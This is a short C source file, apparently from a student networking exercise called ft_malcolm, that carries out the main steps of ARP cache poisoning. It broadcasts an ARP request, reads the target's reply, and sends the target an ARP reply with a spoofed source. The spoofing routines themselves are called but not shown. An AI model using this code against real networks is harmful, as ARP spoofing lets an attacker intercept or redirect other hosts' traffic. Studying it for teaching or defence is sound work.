
# include <ft_malcolm.h>
# include <arp.h>

# include <netinet/if_ether.h>
# include <stdio.h>

err_t   mandatory_requests(const proginfo_t* const info)
{
    /* As is written in subjet... */

    err_t st = SUCCESS;

    // 1) Print avalaible phisical interface (NIC)
    if ((st = printf_ifnic()) != SUCCESS)
        goto error;

    // 2.1) Broadcast an ARP REQUEST to the network
    if ((st = send_arp_request_to_target(info)) != SUCCESS)
        goto error;

    printf("%s\n", "An ARP request has been broadcast.");

    // 2.2) Receive ARP REPLY form target
    uint8_t buff[255];
    struct sockaddr saddr;
    const ssize_t recvbytes = recvfrom(
        info->sockarp,
        buff,
        sizeof(buff) / sizeof(*buff),
        0,
        &saddr,
        (socklen_t[]){sizeof(saddr)}
    );

    if (recvbytes < 0)
    {
        PRINT_ERROR(MSG_ERROR_SYSCALL, "recvfrom");
        st = INVSYSCALL;
        goto error;
    }

    const struct ether_arp* const arp = (const struct ether_arp*)(buff + sizeof(struct ethhdr));

    // 2.3) Print received hardware address & ip address
    printf("%s", "\tmac address of request: ");
    PRINT_MAC(arp->arp_sha, true);
    printf("%s", "\tIP address of request:");
    PRINT_IP(arp->arp_tpa, true);

    // 3) Send ARP REPLY to target
    printf("%s\n", "Now sending an ARP reply to the target address with spoofed source, please wait...");
    if ((st = send_arp_reply_to_target(info)) != SUCCESS)
        goto error;
    printf("%s\n", "Sent an ARP reply packet, you may now check the arp table on the target.\nExiting program...");

error:
    return st;
}
